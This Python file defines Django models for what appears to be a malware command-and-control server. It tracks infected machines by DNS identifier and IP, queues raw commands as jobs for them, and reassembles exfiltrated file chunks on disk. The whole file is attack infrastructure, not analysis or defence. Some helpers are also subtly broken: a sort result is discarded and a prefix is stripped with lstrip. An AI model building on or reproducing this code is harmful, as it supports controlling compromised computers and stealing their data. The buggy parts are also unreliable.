from __future__ import annotations

import os

from decouple import config
from django.db import models


class InfectedMachine(models.Model):
    created_at = models.DateTimeField(auto_now_add=True)
    last_handshake_at = models.DateTimeField(null=True)
    dns_identifier = models.CharField(max_length=100, db_index=True)
    name = models.CharField(max_length=100)
    ip = models.CharField(max_length=100, null=True)
    job_ask_count = models.IntegerField(default=0)

    def get_current_job(self) -> Job|None:
        return self.job_set.filter(finished_at=None).order_by('-created_at').first()

    def finished_jobs_count(self) -> int:
        return self.job_set.filter(finished_at__isnull=False).count()

class Job(models.Model):
    created_at = models.DateTimeField(auto_now_add=True)
    infected_machine = models.ForeignKey(InfectedMachine, on_delete=models.CASCADE)
    raw_command = models.TextField()
    started_at = models.DateTimeField(null=True)
    finished_at = models.DateTimeField(null=True)
    chunks_received_count = models.IntegerField(default=0)

    def data_folder_path(self) -> str:
        return f"{config('FOLDER_DATA')}/{self.infected_machine_id}/{self.id}"

    def extracted_file_path(self) -> str:
        return f"{self.data_folder_path()}/extracted"

    def has_extracted_file(self):
        return os.path.isfile(self.extracted_file_path())

    def get_sorted_chunks(self) -> list[str]:
        if not os.path.exists(self.extracted_file_path()):
            return []

        chunks = [f for f in os.listdir(self.data_folder_path()) if f.startswith('chunk-')]
        chunks.sort(key=lambda x: int(x.split('-')[1]))
        return chunks

    def find_missing_chunks(self) -> str:
        if not os.path.exists(self.extracted_file_path()):
            return "No chunks yet"
        chunks = [int(f.lstrip("chunk-")) for f in os.listdir(self.data_folder_path()) if f.startswith('chunk-')]
        sorted(chunks)

        missing = []
        for i in range(chunks[0], chunks[-1] + 1):
            if i not in set(chunks):
                missing.append(i)

        return ", ".join(str(m) for m in missing) if missing else "Aucun ne semble manquer"

class JobEndQueue(models.Model):
    created_at = models.DateTimeField(auto_now_add=True)
    processable_at = models.DateTimeField(null=False)
    job = models.ForeignKey(Job, on_delete=models.CASCADE)
